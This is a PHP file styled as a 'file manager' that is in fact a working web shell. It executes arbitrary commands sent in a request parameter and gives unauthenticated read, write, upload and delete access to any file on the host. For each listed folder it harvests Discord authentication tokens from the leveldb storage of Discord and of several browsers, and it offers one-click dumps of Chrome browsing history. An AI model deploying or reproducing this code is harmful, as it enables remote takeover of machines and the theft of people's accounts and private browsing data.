<?php
    #    coisafeia.php
    #    file manager
    #    ©guh industries

    $rawdir = 'C:/';
    $dir = scandir($rawdir);
    if(isset($_REQUEST['path'])){
        $rawdir = $_REQUEST['path']; //str_replace("\ ","%20",realpath($_REQUEST['path']) ? realpath($_REQUEST['path']) : $_REQUEST['path']);
        if(is_dir($_REQUEST['path'])) {
            $dir = scandir($rawdir);
        } else {
            $e = preg_split("/\/+/", $rawdir);
            $dir = array("name" => $e[count($e)-1], "path" => $e);
        };
    };
    if(isset($_REQUEST['raw'])) {
        $e = preg_split("/\/+/", $_REQUEST['raw']);
        $l = $e[count($e)-1];
        #echo var_dump($e);
        if(isset($_REQUEST['dl'])) {
            header("Content-Disposition: attachment; filename=$l");
        };
        if(is_file($_REQUEST['raw']) && is_readable($_REQUEST['raw'])) {
            header('Content-Type:');
            readfile($_REQUEST['raw']);
            die();
        } else {
            echo 'nuh uh';
            die();
        };
    };

    function human_filesize($bytes, $decimals = 2) { #ggrks
        $factor = floor((strlen($bytes) - 1) / 3);
        if ($factor > 0) $sz = 'KMGT';
        return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$sz[$factor - 1] . 'B';
    }
    $is_sqlite = false;

    if(is_file($rawdir)){
        $aga = fopen($rawdir,'r');
        if(fread($aga,15) == 'SQLite format 3') $is_sqlite = true;
        fclose($aga);
    };

    function rrmdir($src) {
        $dir = opendir($src);
        while(false !== ( $file = readdir($dir)) ) {
            if (( $file != '.' ) && ( $file != '..' )) {
                $full = $src . '//' . $file;
                $full = str_replace(" ","\\ ", $full);
                if ( is_dir($full) ) {
                    rrmdir(urldecode($full));
                }
                else {
                    unlink(urldecode($full));
                }
            }
        }
        closedir($dir);
        rmdir($src);
    }

    function boiola($har){
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . $har, true, 303);
        exit();
    }

    $voltado = preg_split("/[\/]+/", $rawdir);
    unset($voltado[count($voltado)-1]);
    $voltado = join('/',$voltado);

    $cmdoutput = "";
    if(isset($_REQUEST['action'])) {
        switch($_REQUEST['action']){
            case 'rename':
                if(!isset($_REQUEST['newname'])) boiola($rawdir);
                $e[count($e)-1] = $_REQUEST['newname'];
                rename($rawdir,join('/',$e));
                boiola(join('/',$e));
            break;
            case 'delete': 
                if(is_file($rawdir)){
                    unlink($rawdir);
                } elseif(is_dir($rawdir)){
                    rrmdir($rawdir);
                }
                boiola($voltado);
            break;
            case 'cmd':
                if(!isset($_REQUEST["cmd"])) boiola($rawdir);
                $cmdoutput = shell_exec(preg_replace("/__owo__/",$rawdir,$_REQUEST["cmd"]) . "  2>&1");
                $_REQUEST["action"] = null;
            break;
        };
    };

    if(isset($_POST['action'])) {
        switch($_POST['action']) {
            case 'upload':
                if(!isset($_FILES['arquivo'])){
                    echo "<h1> fairu doko </h1>";
                };
                if(move_uploaded_file($_FILES['arquivo']['tmp_name'], $rawdir . '/' . ($_FILES['arquivo']['full_path'] ?? $_FILES['arquivo']['name']))){
                    echo '<h1 style="background-color:lightgreen;"> yippee <a href="?path=' . $rawdir . '/' .  ($_FILES['arquivo']['full_path'] ?? $_FILES['arquivo']['name']) . '"> ' . $rawdir . '/' .  ($_FILES['arquivo']['full_path'] ?? $_FILES['arquivo']['name']) . ' </a> </h1>';
                } else {
                    echo '<h1 style="background-color:red;"> fairu upload shitanai (error) </h1>';
                }
            break;
            case 'edit':
                if(!isset($_POST['content'])){
                    echo '<h1 style="background-color:red;"> wtf where new content </h1>';
                } elseif(!is_readable($rawdir)) {
                    echo '<h1 style="background-color:red;"> unable to write (its actually a folder/read only) </h1>';
                } else {
                    file_put_contents($rawdir, $_POST['content']);
                    echo '<h1 style="background-color:lightgreen;"> successfully edited </h1>';
                };
            break;
        };
    }; ?>
    <!DOCTYPE html>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
        <h3><?=$rawdir?></h3>
        <!-- <style> *{font-size:18px} table,tr,td,th{border:1px solid black;border-collapse:collapse;}</style> -->
        <form action="" method="post" class="form-group">
            <input type="hidden" name="action" value="cmd">
            <input type="hidden" name="path" value="<?=$rawdir?>">
            <input type="text" name="cmd" class="form-control"value='<?php
                if(is_file($rawdir)){
                    echo "icacls \"$rawdir\" /grant ACAD:R";
                };?>'>
            <input type="submit" value="exec cmd (use __owo__ to represent current folder)">
        </form>
        <pre><?=$cmdoutput?></pre>
    <?php 
    if(is_dir($rawdir)) {?>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="hidden" name="path" value="<?=$rawdir?>">
            <input type="file" name="arquivo">
            <input type="submit">
        </form>
        <p></p>
        <label for="qa">Quick action:</label>
        <select name="qa" id="qa">
            <option value="chrome" selected>go to user chrome folder</option>
            <option value="discord">console.log user discord tokens</option>
        </select>
        <script>
            document.body.onload = ()=>{
                const socoror = e=>{
                    const selection = e
                    switch(selection){
                        case "chrome":
                            for(const DESGRAÇA of document.querySelectorAll('.q')) {
                                DESGRAÇA.href = DESGRAÇA.querySelector('input[name="chrome"]').value;
                            }
                        break;
                        case "discord":
                            for(const DESGRAÇA of document.querySelectorAll('.q')) {
                                DESGRAÇA.href = `javascript: console.log(${DESGRAÇA.querySelector('input[name="tokens"]').value})`;
                            }
                        break;
                    };
                }
                console.log(1);
                document.querySelector('#qa').addEventListener('change',e=>{socoror(event.target.value.substring(e.target.selectionStart,e.target.selectionEnd))})
                socoror('chrome')
                globalThis.rename = function(rawdir, old){
                    const porro = prompt(`Rename ${old}:`, old)
                    if(confirm(`Would you like to rename "${old}" to "${porro}"?`)) {
                        document.querySelector('#rpath').value = rawdir.replace(/\\/g,"\\\\") + "/" + old;
                        document.querySelector('#newname').value = porro;
                        document.querySelector('#rform').submit()
                    }
                }
                globalThis.dlete = function(rawdir, old){
                    if(confirm(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠤⠖⠛⠉⠉⠉⠉⠉⠉⠓⠲⠤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⠔⠋⢀⠄⠊⠀⠀⠤⢀⠀⠒⠢⡀⠀⠀⠀⠙⠢⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⠖⠁⠀⠀⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠄⠀⠀⠀⠀⠈⢧⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢰⠋⠀⠀⢀⣼⠇⢀⡎⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⡟⠀⢠⢂⡾⣿⢆⣿⡑⠀⠀⠀⢀⡀⢸⠀⣿⡀⢸⡄⠀⠀⠀⠀⠀⢧⠀⠀⠀⠀
⠀⠀⣀⡴⠋⠀⠀⡾⣸⠇⠧⠞⡹⠉⠀⠀⠀⢸⢀⣿⣴⢏⣧⢸⡿⠀⠀⠀⠀⠀⠸⡆⠀⠀⠀
⠈⠙⠧⢴⡎⠀⠀⣷⣏⣠⣴⣶⣯⡂⠐⠒⠢⠏⠞⣽⠋⠀⠿⢼⢻⠀⠀⠀⠀⠀⢳⣷⠀⠀⠀
⠀⠀⠀⢸⢠⠄⠀⡿⣿⠋⣎⣸⣟⡏⠀⠀⠀⠀⠀⣿⣿⣿⢦⡀⢸⡂⠀⠀⠐⢸⡀⠛⢤⣀⠀
⠀⠀⠀⢸⡰⡇⠀⣿⡝⠀⢯⣈⣹⠇⠀⠀⠀⠀⢸⢣⣾⣛⡇⢻⣾⠁⠀⡆⠀⢸⡿⣶⠒⠚⠉
⠀⠀⠀⠀⢷⣳⡀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠧⣄⡼⠃⠈⡼⠀⢠⡇⠁⣸⢿⠇⠀⠀⠀
⠀⠀⠀⠀⠈⠛⢷⡀⢿⣷⣤⣀⠀⠀⢄⡀⢀⡀⠀⠀⠀⠀⠀⣰⠇⢐⣼⢁⣴⣿⠟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠚⠻⠉⠀⣽⣶⣶⡶⠥⠤⣤⣴⣶⣶⢿⠏⣴⣾⣻⣽⠋⠈⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣷⣿⠈⠑⢚⣿⣟⣿⣿⠛⠋⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⢿⣟⣿⣿⣿⣿⣿⣿⣾⡟⣟⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⢯⣿⡞⢺⣿⣿⣿⣿⣿⠿⣞⡵⣫⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡞⢳⣿⡷⣭⣿⣿⣿⣿⣿⣿⡖⣿⣷⣭⠿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢹⣽⡁⣿⣿⣿⣿⣛⣿⡟⢱⢿⣾⡿⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡷⣻⣷⣾⣿⣿⣿⣿⡿⡽⣞⣿⠉⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⡇⠀⠀⢸⢏⠉⠿⢳⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⢸⢸⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡶⣶⡟⠘⡤⢤⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠉⠁⠀⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`)) {
                        document.querySelector('#dpath').value = rawdir.replace(/\\/g,"\\\\") + "/" + old;
                        document.querySelector('#dform').submit()
                    }
                }
            }
        </script>
        <form action="" method="get" id="rform">
            <input type="hidden" name="path" value = "" id="rpath">
            <input type="hidden" name="action" value = "rename">
            <input type="hidden" name="newname" value = "" id="newname">
        </form>
        <form action="" method="get" id="dform">
            <input type="hidden" name="path" value = "" id="dpath">
            <input type="hidden" name="action" value = "delete">
        </form>
        
            <table class = "table table-striped">
                <tr>
                    <th>
                        file name
                    </th>
                    <th>
                        :3
                    </th>
                    <th>owo</th>
                    <th>
                        quick action
                    </th>
                </tr>
            <?php 
                for($i = 0; $i < count($dir); $i++) {?>
                    <tr>
                        <td><p><a class="fs-4"href="?path=<?=$rawdir . '/' . $dir[$i]?>">
                    <?php
                    if(is_dir($rawdir . '/' . $dir[$i])) {
                        echo "\u{1f4c2}";
                    };
                    ?><?=$dir[$i]?></a></p></td>
                    <td>
                        <button class = "btn btn-warning" onclick='rename(`<?=str_replace("/","\\\\",$rawdir)?>`, `<?=$dir[$i]?>`)'>Rename</button>
                    </td>
                    <td>
                        <button class = "btn btn-danger" onclick='dlete(`<?=str_replace("\\","\\\\",$rawdir)?>`, `<?=$dir[$i]?>`)'>Delete</button>
                    </td>
                    <td> <a class="q btn btn-info">welcome to my woorld *gets chalked* <form><input type="hidden" name="tokens" value='<?php 
                                    $euqueromematar = '';
                                    $reg="/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/";
                                    $folders=['appdata/Discord',"appdata/discordcanary","appdata/discordptb","localappdata/Google/Chrome/User Data/Default/Network","appdata/Opera Software/Opera Stable","appdata/Opera Software/Opera GX Stable","localappdata/BraveSoftware/Brave-Browser/User Data/Default","localappdata/Yandex/YandexBrowser/User Data/Default"];
                                    $userdir=$rawdir;
                                    $localappdata=$userdir.'/AppData/Local';
                                    $appdata=$userdir.'/AppData/Roaming';
                                    foreach($folders as $browser){
                                        $browser=preg_replace("/localappdata/",$localappdata,$browser);
                                        $browser=preg_replace("/appdata/",$appdata,$browser);
                                        $leveldb=$browser.'/Local Storage/leveldb';
                                        if(is_dir($leveldb)){
                                            $guh=scandir($leveldb);
                                            $cuh=array_filter($guh,function($v,$k){
                                                return substr($v,-4)==".ldb" || substr($v,-4)==".log";
                                            },ARRAY_FILTER_USE_BOTH);
                                            foreach($cuh as $ii=>$dbfile){
                                                $data=file_get_contents($leveldb.'/'.$dbfile);
                                                if(preg_match_all($reg,$data)>0){
                                                    $euqueromematar = $euqueromematar . '"file":"'.$leveldb.'/'.$dbfile.'","';
                                                    preg_match("/(\d{2}\/){2}\d{4}\s\d{2}:\d{2}/", shell_exec('for %A in ("'.$leveldb.'/'.$dbfile.'") do echo %~tA'),$guhh);
                                                    $euqueromematar = $euqueromematar . '"modify":'.$guhh[0].'",';
                                                    $aaaaa=[];
                                                    preg_match($reg,$data,$aaaaa);
                                                    $euqueromematar = $euqueromematar . '"tokens":[';
                                                    foreach($aaaaa as $iii=>$token){
                                                        $euqueromematar = $euqueromematar . '"'.$token.'",';
                                                    };
                                                    $euqueromematar = $euqueromematar . "]}";
                                                    };
                                                };
                                            };
                                        }; 
                                        echo $euqueromematar;
                                    ?>'> <input type="hidden" name="chrome" value='?path=<?=$rawdir . '/' . $dir[$i]?>/AppData/Local/Google/Chrome/User%20Data/Default/History&action=sqlite&query=.dump'> <input type="hidden" name="delete" value="?path=<?=$rawdir . '/' . $dir[$i]?>&action=delete"> </form>
                                      
                                </a> </td>
                </tr>
                <?php
                };
            ?>
            </table>
              <?php  
    } elseif(isset($_REQUEST['action'])){ 
        switch($_REQUEST['action']){
            case 'edit': ?>
        <p><a class="btn btn-secondary" href="?path=<?=$rawdir?>"> Return </a></p>
        <?php 
            if(is_dir($rawdir)) { ?>
                <div class="alert alert-danger fs-3"> not a file (its a folder)</div>
            <?php } else { ?>
                <?=!is_readable($rawdir) ? '<div class="alert alert-danger fs-3"> kono fairu wa NOT READABLE desu nihonfo jouzu (are you sure its not a folder) </div>' : ''?>
                <?=!is_writable($rawdir) ? '<div class="alert alert-danger fs-3"> kono fairu wa NOT WRITABLE desu (nihongo jjouzu) (are you sure its not a folder) </div>' : ''?>
                <div style="display:flex;flex-direction:column;">
                    <form action="" method="post">
                        <input type="hidden" name="path" value="<?=$rawdir?>">
                        <input type="hidden" name="action" value="edit">
                        <?php
                            if(is_readable($rawdir)){
                                if(filesize($rawdir) > 2097152) { ?>
                                    <div class="alert alert-danger fs-3"> kono fairu wa OOKI desu (nihongo ) (>2mb, wont read) </div>
                                <?php } else { ?>
                                    <textarea class="form-control"spellcheck="false" name="content" cols="60" rows="30" <?=is_writable($rawdir) ? '' : 'readonly'?>><?=file_get_contents($rawdir)?></textarea>
                                    <p>
                                        <input class="btn btn-primary" type="submit" value="Confirm">
                                    </p>
                                <?php }
                            }
                        ?>
                    </form>
                </div>
            <?php }
        ?>
    <?php
            break;
            case 'sqlite':
                if(!is_file('./sqlite3.exe')){ ?>
                    <h1> sqlite3 cli is not installed (place sqlite.exe on the same folder as this php page)</h1>
                    <p><a href="?path=<?=$rawdir?>"> Return </a></p>
                <?php } elseif(!$is_sqlite){ ?>
                    <h1>
                        file is not sqlite
                    </h1>
                    <p><a href="?path=<?=$rawdir?>"> Return </a></p>
                <?php
                } else { 
                    $query = $_REQUEST['query'] ?? '';
                    ?>
                    <p><a href="?path=<?=$rawdir?>"> Return </a></p>
                    <form action="">
                        <input type="hidden" name="path" value="<?=$rawdir?>">
                        <input type="hidden" name="action" value="sqlite">
                        <input id="g" type="text" name="query" style="width:300px;" placeholder="sqlite3 cli cmd" value="<?=$query?>" spellcheck="false">
                        <script>
                            const o = document.querySelector('#g');
                            o.focus();
                            o.select();
                        </script>
                    </form>
                    <?php
                    echo '<pre>' . shell_exec('sqlite3.exe -box "' . $rawdir . '" "' . $query . '" 2>&1') . '</pre>';
                }; ?>
            <?php
            break;
            default: ?>
                <h1>invalid action</h1>
                <p><a href="?path=<?=$rawdir?>"> Return </a></p>
            <?php
        }
    } else {
        ?>
        <div>
            <h2><?=is_readable($rawdir) ? human_filesize(filesize($rawdir)) : '??????' ?></h2>
            <p><a class="btn btn-secondary" href="?path=<?=$voltado?>"> Return </a></p>
            <p><a class="btn btn-danger" href="?path=<?=$rawdir?>&action=delete"> Delete </a></p>
            <p><a class="btn btn-primary" href="?path=<?=$rawdir?>&action=edit"> Edit as text (not recommended if >1mb) </a></p>
            <button class="btn btn-warning" id="rename">Rename</button>
            <form action="" id="rform">
                <input type="hidden" name="path" value="<?=$rawdir?>">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="newname" value="" id="newname">
            </form>
            <form action="">
                <input type="hidden" name="raw" value="<?=$rawdir?>">
                <input class="btn btn-info"type="submit" value="View raw file">
            </form>
            <form action="">
                <input type="hidden" name="raw" value="<?=$rawdir?>">
                <input type="hidden" name="dl" value="1">
                <input class="btn btn-info" type="submit" value="Download">
            </form>
                <?=!is_readable($rawdir) ? '<div class="alert alert-danger fs-3"> kono fairu wa NOT READABLE desu nihonfo jouzu (are you sure its not a folder) </div>' : ''?>
                <?=!is_writable($rawdir) ? '<div class="alert alert-danger fs-3"> kono fairu wa NOT WRITABLE desu (nihongo jjouzu) (are you sure its not a folder) </div>' : ''?>
            <?php
                if($is_sqlite){?>
                <div class="alert alert-info fs-3">kono fairu wa (most likely) sqlite format (aaaaaaaaaaaaaaaaaaaaaaaaaaaa)</div>
                    <a class="btn btn-primary" href="?path=<?=$rawdir?>&action=sqlite&query=.dump"> sqlite query</a>
                <?php
                };
            ?>

            <script>
                document.querySelector('#rename').onclick = function(){
                    const porro = prompt("Rename <?=$e[count($e)-1]?>:", "<?=$e[count($e)-1]?>")
                    if(confirm(`Would you like to rename "<?=$e[count($e)-1]?>" to "${porro}"?`)) {
                        document.querySelector('#newname').value = porro;
                        document.querySelector('#rform').submit()
                    }
                }
            </script>
<?php
    };
?>
